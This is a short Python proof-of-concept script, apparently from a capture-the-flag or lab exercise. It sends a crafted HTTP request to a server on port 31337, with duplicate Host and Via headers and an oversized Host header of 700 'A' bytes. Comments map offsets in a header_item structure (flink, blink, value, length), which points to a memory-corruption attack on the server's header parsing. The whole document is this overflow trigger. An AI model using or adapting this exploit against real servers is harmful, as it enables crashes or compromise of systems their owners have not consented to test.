#!/usr/bin/python3

from socket import *
import struct
import sys

addr = '127.0.0.1'
if len(sys.argv) > 1:
    addr = sys.argv[1]
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

x = b'GET /asdf.vbs HTTP/1.1\r\n'
x += b'Host: AAAA\r\n'
x += b'Via: BBBB\r\n'

x += b'Host:' + b'A' * 700
x += b'\r\n\r\n'

s.send(x)

#offsets within header_item
#flink - 0h
#blink - 8h
#hash - 10h
#key - 18h
#value - 20h (this points to offset 28h)
#value_data - 28h
#length - 268h
